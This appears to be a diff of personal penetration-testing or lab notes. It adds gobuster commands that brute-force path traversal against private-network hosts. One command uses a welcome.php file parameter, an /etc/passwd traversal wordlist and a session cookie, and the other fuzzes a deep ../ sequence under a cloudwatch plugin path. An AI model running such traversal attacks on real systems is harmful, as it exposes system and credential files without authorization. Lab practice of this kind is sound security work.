@@ -1,2 +1,4 @@
 #Brute force path traversal with valid sessions cookie and excluding 302 responses. Proxying through burp
 gobuster fuzz -u "http://192.168.213.209/welcome.php?file=FUZZ" -w ~/wordlists/path-traversal/etc-passwd-traversal.txt --proxy http://127.0.0.1:8080 -b 302 -c "Cookie: PHPSESSID=strvnpgakqmeupj4neosglgbrf"
+
+gobuster fuzz -u "http://192.168.112.181/public/plugins/cloudwatch/../../../../../../../../../../../../../FUZZ" -w ~/wordlists/path-traversal/ --proxy http://127.0.0.1:8080
